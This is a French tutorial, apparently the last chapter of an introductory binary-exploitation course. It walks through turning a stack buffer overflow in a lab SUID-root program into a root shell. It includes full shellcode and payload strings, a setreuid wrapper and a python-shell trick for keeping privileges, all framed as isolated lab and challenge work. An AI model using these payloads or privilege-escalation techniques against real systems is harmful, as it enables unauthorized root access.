---
title: Partie 7 - Exploiter un BO - pile exécutable – exploitation complète (4/4)
date: 2026-05-02 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Exploiter un *stack buffer overflow* : pile exécutable – exploitation complète (4/4)

Courage ! Nous sommes à la dernière étape de *pwn* avant de devenir `root`. Avant cela, parlons des programmes **SUID** car il s'agit très souvent de ce que vous risquez de rencontrer dans des **challenges**, ou dans la vraie vie.

⚠️ Attention, avant d’aborder ce chapitre, vous devez normalement **avoir noté quelque part** le *payload* qui vous a permis d’exploiter le programme au chapitre précédent. Il est, par exemple, sous la forme :

```sh
(echo -e '/bin/sh\x00-p\x00\x00\xdd\xff\xff\x08\xdd\xff\xff\x00\x00\x00\x00\xBB\x00\xDD\xFF\xFF\xB9\x0B\xDD\xFF\xFF\xBA\x00\x00\x00\x00\xB8\x0B\x00\x00\x00\xCD\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\xde\xff\xffEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x17\xdd\xff\xff'; cat -) | ./wrapper
```

Il est important de l'avoir sous la main car vous allez devoir **réutiliser des adresses** que vous avez précédemment trouvées dans **gdb**. De cette manière, vous ne devriez pas avoir à le refaire ici.

## 🔐 Les programmes SUID

Un programme **SUID** (Set User ID) est un exécutable auquel est associé un bit de permission appelé "**bit SUID**". Lorsqu'il est activé, ce bit permet au programme d'être exécuté **avec les privilèges du propriétaire du fichier**, plutôt qu'avec ceux de l'utilisateur qui l'exécute.

Pour illustrer ce système avec un exemple concret, imaginez quelqu'un dans un centre commercial cherchant à accéder aux **toilettes publiques**, mais celles-ci sont fermées pour travaux. Il demande alors au vigile de lui prêter son **badge** pour utiliser les **toilettes du personnel**, et le vigile accepte par gentillesse. Une fois en possession de ce badge, la personne peut non seulement **accéder aux toilettes réservées au personnel**, mais aussi potentiellement entrer dans des **zones strictement interdites au public**.

Des programmes **SUID**, vous en connaissez, et pas qu'un seul ! A titre d'exemple : `sudo` et `passwd`. Il fut un temps où `ping` était SUID car il avait besoin des droits `root` pour utiliser un [raw socket](https://en.wikipedia.org/wiki/Network_socket). Désormais cela est fait sans que le programme soit **SUID**.  

Le bit **SUID** permet d'autoriser des utilisateurs lambda à réaliser certaines actions **nécessitant des privilèges élevés** sans pour autant leur donner **tous les droits** que peut avoir `root`. Il s'agit de restreindre le champ d'action à ce que peut faire le programme **SUID**, enfin, en principe si vous voyez ce que je veux dire 😉. Il y a même des programmes d'élévation de privilèges qui **listent tous les programmes SUID** présents sur une machine. Par exemple : [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

C'est pourquoi ce type de programme est particulièrement prisé par les **chercheurs de vulnérabilités**. Il s'agit de points d'entrée, **accessibles à quasiment n'importe qui**, pour devenir `root`.

Le **bit SUID est visible** quand vous affichez les informations d'un fichier (avec `ls -la` par exemple). Voici un exemple avec `passwd` :

```sh
ll $(which passwd)    
.rwsr-xr-x root root (...) /usr/bin/passwd
#  ^
```

On remarque la présence du `s` dans `rws`. Également, lorsque l'on utilise la commande `file` sur ce fichier, on y voit que le programme est `setuid`, alias **SUID** : `/usr/bin/passwd: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped`.

## 🛣️ La route pour devenir `root`

> ⛔ Attention ! ⛔
> 
> Ce qui va être réalisé en **rendant le programme SUID** pour l'utilisateur `root` est très dangereux. En faisant cela, nous sommes en train de **tendre le bâton** à un potentiel attaquant pour qu'il puisse devenir `root` en un clin d’œil.
> 
> Nous réalisons cette périlleuse acrobatie ici **à des fins pédagogiques** car il y a beaucoup de choses à apprendre à travers le **système SUID**. Ne reproduisez pas ça sur votre propre machine ! 
> 
> Si vous souhaitez le tester de votre côté, faites-le dans une **machine virtuelle** déconnectée d'internet et/ou dans le **conteneur Docker** ci-dessous qui est mis à disposition pour ce chapitre. 
{: .prompt-danger }

> Vous remarquerez que dans les challenges d'élévation de privilège en *pwn*, les programmes sont SUID avec **un compte différent de** `root` et qui n'a pas de privilèges élevés. Cela permet de gérer plusieurs challenges à la fois et d'éviter qu'une personne qui réussit à exploiter un programme puisse faire tout ce qu'elle souhaite sur une machine.
> 
> Considérons un programme que l'utilisateur `lambda`, ayant des privilèges classiques, peut exécuter. Soit `flag.txt` le fichier contenant le *flag* du challenge qui n'est lisible que par l'utilisateur `alpha`. Alors en rendant le programme SUID pour l'utilisateur `alpha` on fait une pierre deux coups : le fichier `flag.txt` n'est pas lisible par n'importe quel utilisateur `lambda` et même en élevant ses privilèges vers l'utilisateur `alpha`, **il n'est pas possible de faire tout ce que l'on souhaite sur la machine**.
{: .prompt-tip }

Il va falloir rendre le programme SUID si on veut être `root` à un moment ou un autre. Si vous ne voulez pas vous prendre la tête, vous pouvez télécharger l'archive suivante qui permet d'avoir directement le programme SUID. Cela permet d'avoir directement accès au programme vulnérable qui a le bit SUID présent pour l'utilisateur `root` via un conteneur Docker.

- ⬇️ **Téléchargement** : [pwn-stack-vuln-no-nx-suid.zip](https://drive.proton.me/urls/6JQ9T2D1YG#6JbFq4QrLenE)
- 🔎 **SHA256 & Analyse Virus Total** : [73003713165ed7d6f641fa0dde5592fed984fb838ab69daff870bd212d4848ff](https://www.virustotal.com/gui/file/73003713165ed7d6f641fa0dde5592fed984fb838ab69daff870bd212d4848ff)
- ⚙️ **Construction et lancement du conteneur** :

Pour construire et lancer le conteneur :

```sh
docker build -t pwn-stack-vuln-no-nx-suid .

docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-stack-vuln-no-nx-suid
```

Sinon, sur votre machine virtuelle **coupée du monde extérieur**, cela est faisable avec les commandes suivantes :

```sh
sudo chown root:root vuln_no_nx
sudo chmod u+s vuln_no_nx

# Renommer pour plus de clarté
mv vuln_no_nx vuln_no_nx_suid
```

Le fait d'ajouter le bit SUID **ne modifie pas le contenu du programme** mais **seulement ses permissions**. Nous pouvons donc **réutiliser** le *payload* du précédent chapitre pour l'exploiter.

Nous pouvons réutiliser ce *payload* comme suit :

1. compiler le programme [wrapper.c](/posts/introduction_au_pwn_partie_6/#abandon-des-variables-denvironnement) sans oublier de **modifier le nom du programme à lancer** ;
2. récupérer le *payload* que vous avez obtenu à la fin du précédent chapitre ;
3. lancer le programme avec : `( echo -e 'VOTRE_PAYLOAD' ; cat -)   | ./wrapper`.

> **Prenez bien le temps** de réaliser ces différentes étapes, notamment la dernière car nous allons devoir modifier les **différentes adresses utilisées** au sein de notre *payload* pour l'améliorer.
> 
> Notez le *payload* ainsi que les différentes adresse utilisées quelque part.
{: .prompt-warning }

Nous obtenons ceci :

![](/assets/images/introduction_au_pwn/not_root_bis.png)

L'exploit fonctionne (ouf 😅) et permet d'ouvrir un *shell* ... mais nous ne sommes toujours pas `root` 😔!

> **Rappel** : n'oubliez pas de **désactiver l'ASLR** et **d'adapter le nom du programme** à exécuter dans `wrapper.c`.
{: .prompt-tip }

### Raison de l'absence d'élévation de privilèges

> Encore un souci lié à ces fichues variables d'environnement 😡! 
{: .prompt-info }

Non, ce n'est **pas lié aux variables d'environnement** ! En réalité le problème ne vient pas du programme ni du *payload* en lui-même. Il vient **de la manière dont on a ouvert** un *shell*.

Pour illustrer mes propos, je vais utiliser ce programme minimaliste :

```cpp
#include <stdio.h>  
#include <unistd.h>  
  
int main()    
{  
   char *args[] = {"/bin/sh", NULL};  
   execv("/bin/sh", args);  
   return 1;  
}
```

En l'exécutant tel quel, nous ne serons évidemment pas `root`. Qu'en serait-il si le programme était SUID ?

```sh
sudo chown root:root test
sudo chmod u+s test

./test
$ whoami
$ challenger
```

> Si vous souhaitez reproduire cet exemple dans le conteneur de ce chapitre, vous pouvez utiliser `docker exec --user root -it ID_DU_CONTENEUR /bin/bash` pour **avoir accès à un terminal en tant que** `root` le temps de **rendre le programme SUID**.
> 
> Par contre, veillez bien à le lancer ensuite en tant qu'utilisateur `challenger`.
{: .prompt-tip }

Nous ne sommes toujours pas `root`. Le problème vient donc :

- soit du programme lancé `/bin/sh` ;
- soit de la fonction appelée `execv`.

### Une question de privilèges 🧐

Commençons par investiguer la première hypothèse. En lisant le manuel de `sh`, vous devriez tomber sur une **option qui pique notre curiosité** : 

```
-p priviliged    

Do not attempt to reset effective uid if it does not match uid. This is not set by default to help avoid incorrect usage by setuid root programs via system(3) or popen(3). 
```

Il s'agit d'une option qui, par défaut, **n'est pas activée**. On en déduit donc que, comme nous ne l'avons pas spécifiée, l'**UID effectif** (ou **EUID**) a été réinitialisé avec l'**UID**.

> Quelle est la différence entre les deux 🤔?
{: .prompt-info }

Tout d'abord, il est nécessaire de comprendre une chose. Dans Linux, les **utilisateurs** ainsi que les **processus** ont des **identifiants**. Pour les processus, il est possible de faire l'analogie entre les **identifiants sous Linux** avec les **[jetons d'accès](https://learn.microsoft.com/fr-fr/windows/win32/secauthz/access-tokens) sous Windows**.

Dans le noyau Linux, ces différents identifiants sont présents dans la structure `cred` dont les [premiers membres](https://elixir.bootlin.com/linux/v6.11.5/source/include/linux/cred.h#L111) sont les suivants :

```c
struct cred 
{ 
atomic_long_t	usage; 
kuid_t		uid;		/* real UID of the task */ 
kgid_t		gid;		/* real GID of the task */ 
kuid_t		suid;		/* saved UID of the task */ 
kgid_t		sgid;		/* saved GID of the task */ 
kuid_t		euid;		/* effective UID of the task */ 
kgid_t		egid;		/* effective GID of the task */ 
kuid_t		fsuid;		/* UID for VFS ops */ 
kgid_t		fsgid;      /* GID for VFS ops */
/* autres membres ... */
};
```

Si vous êtes habitués à utiliser Linux, vous savez que dans les identifiants et permissions il y a une notion **d'utilisateurs et de groupes**. Pour les processus, c'est pareil. Toutefois, nous n'avons pas besoin de nous préoccuper de cette histoire de groupes pour l'instant.

Concentrons-nous sur les **4 identifiants** suivants : 

- `ruid` (**real UID**) : parfois directement désigné `uid`, il s'agit de l'identifiant de l'utilisateur qui **lance le processus**. Généralement, il s'agit du même UID que celui qui s'affiche quand vous exécutez la commande `id` (ex : `uid=1001(...)`).
- `euid` (**effective UID**) : il est utilisé pour déterminer **les permissions qu'un processus possède** lorsqu'il accède à certaines ressources. C'est ce qui est utilisé par les programmes **SUID** pour nous permettre d'avoir **plus de privilèges** lors de l'exécution du processus. C'est l'identifiant de celui **au nom de qui** le programme est lancé.
- `suid` (**saved UID**) : il s'agit d'une **sauvegarde** de `euid` au lancement du processus. Cela permet de modifier `euid` avec la valeur de `ruid` (**réduction de privilèges**) ou avec la valeur de `suid` (**élévation de privilèges**). ⚠️ A ne pas confondre avec le **bit SUID** (Set User ID) qui est un bit attribué au **programme** avant son exécution alors que `suid` est un **identifiant** défini pour un **processus**.
- `fsuid` (**filesystem UID**) : cet identifiant est utilisé pour gérer les permissions lors de l'accès aux fichiers. Sauf exceptions, il est toujours égal à `euid`. C'est pour ça qu'avec une programme SUID `root`, comme `euid == 0`, il est possible d'accéder à des fichiers dont seul l'utilisateur `root` a l'accès.

Pour plus d'informations sur ces identifiants, vous pouvez vous rendre dans le manuel suivant : `man 7 credentials`.

A titre d'exemple, en lançant un programme SUID comme `passwd`, le `ruid` pendant l'exécution du programme reste `1000` (utilisateur classique) tandis que l'`euid` lui vaut `0` (`root`).

En revenant à l'option `-p` de `/bin/sh`, on comprend que lorsque `ruid != euid` et que cette option n'est pas spécifiée, alors l'`euid` **est réinitialisé avec la valeur de** `ruid`.

Modifions le précédent **programme de test** pour utiliser cette option désormais :

```cpp
// char *args[] = {"/bin/sh", NULL}; 
char *args[] = {"/bin/sh", "-p", NULL}; 
```

On compile, on lui donne le bit SUID et on l'exécute :

```sh
sudo chown root:root test
sudo chmod u+s test

./test
# $ whoami
# root
# $ id
# uid=1001(challenger) gid=1001(challenger) euid=0(root) groups=1001(challenger)
```

Là, ça fonctionne ! L'`euid` n'étant pas réinitialisé, le processus garde les privilèges de `root` lors de l'ouverture du *shell*.

### Modification du shellcode

De la même manière que **l'option** `-p` a été ajoutée dans le programme de test, il est nécessaire **d'adapter** le _shellcode_ pour **inclure cette option** lors de l'exécution du _syscall_ `execve`.

Pour rappel, le *shellcode* utilisé est le suivant, avec `0xffffdd10` (à adapter) qui pointe vers `/bin/sh\x00` :

```nasm
mov ebx, 0xffffdd10 ; pointe vers filename
mov ecx, 0          ; pointe vers argv
mov edx, 0          ; pointe vers envp
mov eax, 0x0b
int 0x80
```

> Pour rappel, l'adresse que contiendra `ebx` est l'adresse du *buffer* `prenom`.
{: .prompt-tip }

`filename` et `envp` n'ont pas besoin d'être modifiés. Toutefois, il va falloir modifier `argv` pour que nous puissions utiliser le paramètre `-p`. Il est nécessaire que l'on forme `argv` comme suit : `{"/bin/sh", "-p", NULL}`. Pour [rappel](https://reverse.zip/posts/introduction_au_reverse_partie_8/#argc-argv-et-envp), `argv[0]` **pointe toujours vers le nom ou chemin** du programme exécuté.

Nous avons déjà la chaîne de caractère `"bin/sh"` en mémoire, et on connaît même son adresse, autant la réutiliser. Il ne nous manque plus que :

- écrire la chaîne de caractères `"-p"` en mémoire ;
- écrire `NULL` en mémoire, c'est-à-dire `0x00000000`.

> Il peut être parfois judicieux de **réutiliser les moyens du bord**. Si vous savez que `NULL` est présent à une adresse fixe (ex: dans l'entête ELF du programme), autant la réutiliser pour ne pas avoir à l'écrire soit-même et "consommer" de l'espace dans le *buffer* `prenom`.
{: .prompt-tip }

Notre *payload* a actuellement la forme suivante : 

![](/assets/images/introduction_au_pwn/old_sc.png)

Après modifications, il aura la forme suivante : 

![](/assets/images/introduction_au_pwn/new_sc2.png)

> Il n'existe pas **une unique manière** d'agencer les différentes parties du *shellcode*. Nous aurions très bien pu placer `-p` et `NULL`, voire même le tableau de pointeurs `argv`, après le *shellcode*.
{: .prompt-tip }

Evidemment, comme nous venons d'ajouter `3 + 4*3` octets en plus, il sera nécessaire de supprimer 15 caractères `'A'` dans le bourrage de `AAAAA..A`.

Tout d'abord, modifions le *shellcode* pour que `ecx` pointe vers l'adresse de `argv[0]` avant de générer la version finale du *payload* :

```nasm
mov ebx, 0xffffdd10 ; pointe vers filename -> à adapter
mov ecx, 0xffffdd1b ; pointe vers argv -> à adapter
mov edx, 0          ; pointe vers envp
mov eax, 0x0b
int 0x80
```

> Il n'est pas difficile de comprendre pourquoi nous avons utilisé l'adresse `0xffffdd1b` pour `argv`.
> 
> Également, n'oubliez pas qu'il se peut que vous ayez des adresses différentes de celles de ce cours pour `&filename` et `argv`. Elles seront donc à adapter dans le *payload*.
{: .prompt-tip }

Nous [générons](https://defuse.ca/online-x86-assembler.htm) une nouvelle fois les *opcodes* associés : `\xBB\x10\xDD\xFF\xFF\xB9\x1B\xDD\xFF\xFF\xBA\x00\x00\x00\x00\xB8\x0B\x00\x00\x00\xCD\x80`.

> Ici, la taille du *shellcode* demeure `22`. Il faut toujours faire attention au **changement de la taille** car il sera nécessaire **d'adapter le bourrage** en conséquence (en **ajoutant ou supprimant** des caractères).
{: .prompt-warning }

Ajoutons désormais au *payload* les **nouveaux éléments** situés avant le *shellcode* sachant que :

- `argv[0]` vaut `0xffffdd10` (à adapter), il pointe vers l'adresse de `"/bin/sh"` ;
- `argv[1]` vaut `0xffffdd18` (à adapter), il pointe vers l'adresse de `"-p"`.

N'oublions pas de **modifier l'adresse de retour** vers le *shellcode* car celui-ci a été **décalé** de **15 octets**.

Voici le *payload* final :

```
/bin/sh\x00-p\x00\x10\xdd\xff\xff\x18\xdd\xff\xff\x00\x00\x00\x00\xBB\x10\xDD\xFF\xFF\xB9\x1B\xDD\xFF\xFF\xBA\x00\x00\x00\x00\xB8\x0B\x00\x00\x00\xCD\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\x40\xde\xff\xffEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x27\xdd\xff\xff
```

Encore une fois, **les adresses à adapter**, selon ce que vous avez de votre côté sont :

- `\x10\xdd\xff\xff` ➡️ adresse de `"/bin/sh"` (utilisée en tant que `argv[0]`) ;
- `\x18\xdd\xff\xff` ➡️ adresse de `"-p"` (utilisée en tant que `argv[1]`) ;
- `\x10\xDD\xFF\xFF` ➡️ adresse de`"/bin/sh"` (utilisée par le *shellcode* appelant `execve`) ;
- `\x1B\xDD\xFF\xFF` ➡️ adresse de `argv` (utilisée par le *shellcode* appelant `execve`) ;
- `\x40\xde\xff\xff` ➡️ adresse que doit avoir `ecx` en temps normal avant le `pop ecx` ;
- `\x27\xdd\xff\xff` ➡️ adresse de retour (pour sauter dans le *shellcode*).

> Dans le cas où vous **n'avez pas sauvegardé** le *payload* du précédent chapitre, vous pouvez retrouver ces adresses en **déboguant le programme à la volée sans les variables d'environnement** comme cela a été fait au précédent chapitre.
{: .prompt-tip }

## 🎇 Exploitation !

Nous mettons le programme **SUID** pour `root` puis on l'exécute avec notre *payload* fraîchement modifié :

```sh
# Ces deux lignes ne sont pas a executer si vous utilisez
# le conteneur Docker
sudo chown root:root vuln_no_nx_suid
sudo chmod u+s vuln_no_nx_suid

(echo -e '/bin/sh\x00-p\x00\x10\xdd\xff\xff\x18\xdd\xff\xff\x00\x00\x00\x00\xBB\x10\xDD\xFF\xFF\xB9\x1B\xDD\xFF\xFF\xBA\x00\x00\x00\x00\xB8\x0B\x00\x00\x00\xCD\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\x40\xde\xff\xffEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x27\xdd\xff\xff'; cat -) | ./wrapper
```

Le résultat est le suivant :

![](/assets/images/introduction_au_pwn/whoami_root_2.png)

![](/assets/images/introduction_au_pwn/root.gif)

Bravo 😎!

> Pour les obstinés qui ont tout de même mis le programme **SUID pour l'utilisateur** `root`, n'oubliez pas de **supprimer** le programme ou au moins **changer le propriétaire** vers un utilisateur non privilégié avec `chown` 🙄.
{: .prompt-danger }

## ⭐ Bonus : autres méthodes et astuces pour ne pas perdre les privilèges 

Quelques **informations** et **astuces** qui pourraient vous être très utiles ...

### 🟡 Ouvrir un shell ... python 🐍 !

Vous le savez peut-être déjà mais il existe une **multitude de** *shells* : dash, bash, zsh ... Cependant, il existe aussi un autre type de *shell* que vous avez certainement déjà utilisé : le *shell* python ! Celui qui s'ouvre lorsque vous exécutez la commande `python` ou `python3`.

L'avantage du *shell* python ? ✨**Il ne supprime pas les privilèges lorsque** `ruid != euid`✨. De plus, il est plus simple de réaliser un appel à `execve("/usr/bin/python3", NULL, NULL);` qu'à `execve("/bin/sh", args, NULL);` où `args` doit contenir **le nom du programme** ainsi que **l'option** `-p`.

Ainsi, pour éviter de se compliquer la tâche, il est parfois **très utile** d'utiliser un **shell python** à la place.

Ainsi, en modifiant le *payload* afin d'appeler `/bin/usr/python3.10`, par exemple, on arrive à devenir `root` en laissant l'argument `argv` égal à `NULL` :

![](/assets/images/introduction_au_pwn/python_root.png)

```python
import subprocess

result = subprocess.run(["whoami"], capture_output=True, text=True)
print(result.stdout.strip())
```

La modification du *payload* est laissée en **exercice** (facile) au lecteur 😉.

> Une fois le terminal python ouvert et les commandes saisies, vous pouvez utiliser le **raccourcis** `Ctrl+D` pour fermer l'input afin que les **commandes python soient exécutées**.
{: .prompt-tip }

> Cette **astuce** est vraiment **très utile** et permet parfois de ne pas avoir à se plier en 4 pour éviter que `/bin/sh` ne supprime les privilèges du programme SUID.
> 
> A consommer sans modération !
{: .prompt-tip }

### 🟡 Utiliser un *wrapper* `setreuid`

Dans le cas où vous avez un accès `ssh` à la machine contenant le programme vulnérable, il est possible d'appeler certaines fonctions de la **libc** depuis un *wrapper* avant de lancer le programme, à la manière du précédent *wrapper* que nous avions utilisé.

Par contre, cette fois-ci le *wrapper* ne va pas nous servir à lancer le processus vulnérable mais à faire en sorte que lancer le programme `/bin/sh` ne réinitialise pas `euid`.

Voici le contenu de `wrapper_setreuid.c` :

```cpp
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    execve("/bin/sh",0,0);
    return 0;
}
```

Il est nécessaire de bien distinguer ces deux *wrappers* :

1. Le premier *wrapper* `wrapper.c` : surcouche permettant de supprimer les variables d'environnement lors de l'exécution du programme.
2. Le second *wrapper* `wrapper_setreuid.c` : surcouche permettant de faire en sorte que `/bin/sh` ne supprime pas les privilèges élevés.

D'ailleurs, ces deux *wrappers* **n'interviennent pas au même moment** dans l'exploitation du programme vulnérable :

![](/assets/images/introduction_au_pwn/wrappers_x2.png)
> Comment ce *wrapper* est censé nous permettre de lancer `/bin/sh` sans avoir à spécifier `-p` ?
{: .prompt-info }

Tout d'abord, rappelez-vous de **la condition** qui, une fois satisfaite, permet à `/bin/sh` de supprimer les privilèges : `Do not attempt to reset effective uid if it does not match uid.`

Ainsi, `wrapper_setreuid.c` se charge de faire en sorte que `ruid` ait **la même valeur que** `euid`. De cette manière, lorsque `/bin/sh` sera appelé, comme `ruid == euid`, les **privilèges seront transmis** !

Néanmoins l'utilisation, de ce *wrapper* nécessite **deux choses** :

1. Avoir un endroit où il possible **d'écrire** un programme, le **compiler** et **l'exécuter** (ex: `/tmp`).
2. Modifier le *shellcode* afin d'exécuter le *wrapper* au lieu de `/bin/sh` (ex : `/tmp/mon_wrapper` ).

> En réalité, il n'est **pas nécessaire** de pouvoir compiler le *wrapper* sur la machine vulnérable. Du moment qu'il est possible d'y **écrire et exécuter** des fichiers, il est tout à fait possible de le **compiler en local** (en statique de préférence, pour plus de compatibilité), puis le transférer dans un endroit où l'on dispose des droits `rwx`.
{: .prompt-tip }

> **Astuce** : Dans certains challenges, vous verrez que `setreuid` est appelée dans le `main`.
> 
> Cela est généralement mis en place afin de **faciliter l'exploitation** lorsqu'il est compliqué ou très pénible de garder les privilèges lors d'un appel à `/bin/sh`. Cela permet donc de réduire la complexité liée à l'élévation de privilèges afin de se concentrer sur la partie "exploitation" du challenge.
{: .prompt-tip }

### 🟡 Devenir `root` dans **gdb**

Vous ne vous êtes jamais posé la question : en utilisant `set $eip = 0xadresse`, on peut facilement exécuter `/bin/sh -p` via `execve` dans **gdb** ?

Désolé de mettre fin à vos faux espoirs, mais ce n'est **pas possible** 😅.

Si l'on pouvait devenir `root` depuis un débogueur, cela serait possible depuis n'importe quel programme qui utilise la **libc** vu que `execve` serait présente en mémoire. Auquel cas il suffirait de faire `set $eip = execve` (en ayant au préalable mis en place les bons arguments). Imaginez un instant si cela était possible en modifiant le cours d'exécution de `sudo`, par exemple, tout le monde pourrait devenir `root` 🤯. 

Pour comprendre pourquoi une telle **magouille** n'est pas possible, il est important de connaître **l'appel système sous-jacent** qu'utilise un débogueur sous Linux : `ptrace`. Il existe également sous forme de fonction dans la **libc** (cf : `man ptrace`).

Cet appel système est un véritable **couteau suisse** qui permet d'analyser un processus en long, en large et en travers. C'est notamment ce qui est utilisé par `strace`, outil affichant les **appels systèmes** et **signaux** utilisés par un autre programme. 

Pour simplifier, ce qu'il se passe lorsque l'on souhaite déboguer un programme SUID est qu'il est lancé **en ayant un** `euid` **égal au** `ruid` **de l'utilisateur** qui lance le processus. De cette manière, peu importe ce qui est fait dans le programme, il n'y a **pas de risque d'élévation de privilèges**.

Pour les plus curieux, n'hésitez pas à jeter un œil au [fonctionnement de](https://elixir.bootlin.com/linux/v6.12.1/source/kernel/ptrace.c#L409) `ptrace_attach`.

## 🛡️ Contre-mesures

Nous avons brièvement parlé des **contre-mesures** qui permettent d'éviter d'exploiter une pile exécutable :

- **Pile non exécutable** (merci Sherlock 🕵️‍♂️) : évidemment, si le problème est que la pile puisse être exécutable, il suffit qu'elle ne le soit plus par défaut.

Cette **contre-mesure** est notamment gérée par le mécanisme de [bit NX](https://fr.wikipedia.org/wiki/NX_Bit) qui est mis en place **au niveau kernel**. L'explication détaillée de ce mécanisme sort du contexte de ce chapitre et nécessite de comprendre le système de **pagination** de la mémoire.

## 📝 Exercices

### Échauffement

Si vous ne vous sentez pas totalement à l'aise avec l'exploitation d'une pile exécutable, voici **deux petits exercices** que vous pouvez faire :

1. Adapter l'exploit pour ouvrir un *shell* python
2. Adapter l'exploit en utilisant un *wrapper* qui exécute `setreuid` pour ne pas avoir à lancer `/bin/sh -p`

### 🏆 Challenge

Le challenge proposé est d'exploiter le même programme, mais cette fois-ci en **64 bits**. Le code du programme à exploiter est toujours le même :

```cpp
#include "stdio.h"  

int main()  
{  
 char prenom[256] = {0};  // /!\ augmentation de la taille
 gets(&prenom);  
 printf("Bonjour %s !\n",prenom);  
 return 0;  
}
```

Dans l’ensemble, la méthodologie d’exploitation reste sensiblement la même. Sa résolution ne devrait pas être difficile.

- ⬇️ **Téléchargement** : [pwn-stack-vuln-no-nx-suid-64.zip](https://drive.proton.me/urls/8JSM2P7EJM#fk0vkkem4oTp)
- 🔎 **SHA256 & Analyse Virus Total** : [c40b9987a634939822eb2064666651b14795f321215a13e11d545cb7888b5b7c](https://www.virustotal.com/gui/file/c40b9987a634939822eb2064666651b14795f321215a13e11d545cb7888b5b7c)
- 💻 **Contexte d'exécution** : n'oubliez pas de désactiver l'ASLR ! (dans une VM de préférence 🙃) ;
- 🎯 **Objectif** : devenir `root` ;
- 🚫 **Contraintes** : Aucune. Vous pouvez utiliser n'importe quelle astuce vue dans le cadre de ce cours (suppression des variables d'environnement, *shellcode* pour `/bin/sh -p`, *shell* python, *wrapper* `setreuid` ...)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-stack-vuln-no-nx-suid-64 .

docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-stack-vuln-no-nx-suid-64
```

#### 💡 Indices

##### 💡 Indice n°1
```
SWwgeSBhIHF1ZWxxdWVzIGRpZmbDqXJlbmNlcyBhdmVjIGxlIHByw6ljw6lkZW50IGNoYWxsZW5nZSBxdWkgw6l0YWl0IGVuIDMyIGJpdHMuIApFbnRyZSBhdXRyZXMsIGlsIHZhIGZhbGxvaXIgYWRhcHRlciBsZSBzaGVsbGNvZGUgY2FyIGxlcyBhcmd1bWVudHMgZGUgbCdhcHBlbCBzeXN0w6htZSBuZSBzb250IHBhcyB0cmFuc21pcyB2aWEgbGEgcGlsZSBtYWlzIHZpYSBsZXMgcmVnaXN0cmVzLgpEZSBwbHVzLCBsZSBjb250csO0bGUgZGUgYHJpcGAgc2VyYSBwbHVzIGZhY2lsZSBjYXIgYHJzcGAgbmUgc2VyYSwgYSBwcmlvcmksIHBhcyBtb2RpZmnDqSBsb3JzIGRlIGwnw6ljcmFzZW1lbnQgZGUgbCdhZHJlc3NlIGRlIHJldG91ci4=
```

##### 💡 Indice n°2

```
Vm9pY2kgdW5lIHByb3Bvc2l0aW9uIGRlcyBwcmluY2lwYWxlcyDDqXRhcGVzIMOgIHN1aXZyZSA6CgoxLiB0cm91dmVyIGxlIHBhZGRpbmcgw6AgdXRpbGlzZXIgYXZhbnQgZCdhcnJpdmVyIMOgIMOpY3Jhc2VyIGwnYWRyZXNzZSBkZSByZXRvdXIKMi4gw6ljcmlyZSAob3UgdHJvdXZlcikgdW4gc2hlbGxjb2RlIGVuIDY0IGJpdHMgcGVybWV0dGFudCBkJ291dnJpciB1biBzaGVsbCBlbiBnYXJkYW50IGxlcyBwcml2aWzDqGdlcyByb290CjMuIHNhdXRlciBkYW5zIGxlIHNoZWxsY29kZQ==
```

## 📋 Synthèse

Après pas mal de chapitres nous sommes enfin **arrivés à l'objectif** que nous nous étions fixés : exploiter le programme pour devenir `root`. 

Comme vous avez pu le constater, la route était **longue** et nous avions analysé chaque **écueil** qui était présent : l'ASLR, les variables d'environnement, le bit SUID et j'en passe. Au fur et à mesure que vous avancerez en *pwn*, vous allez vous habituer à prendre en considérations ces différentes protections assez rapidement afin de les contourner en adaptant votre manière d'exploiter un programme.

Bien que l’exploitation de la pile exécutable soit un grand classique en **pwn**, les obstacles rencontrés sont loin d’être triviaux et se présenteront fréquemment. Il est donc essentiel de bien les garder dans **un coin de la tête**.

De plus, nous avons fait en sorte de proposer, lorsque cela est possible, différentes **pistes d'exploitations** et différentes **astuces** qui ne sont pas forcément utiles ni très pertinentes dans notre cas mais qui pourraient vous aider à sortir d'une impasse dans un challenge où une contrainte (ex: taille du shellcode limitée, pas de connexion ssh possible ...) vous empêche d'exploiter facilement le programme.

Beaucoup de détails ont été vus au cours de cette partie, n'hésitez pas à y revenir lorsqu'une notion vous paraît floue ou pour tout simplement vous rafraîchir la mémoire.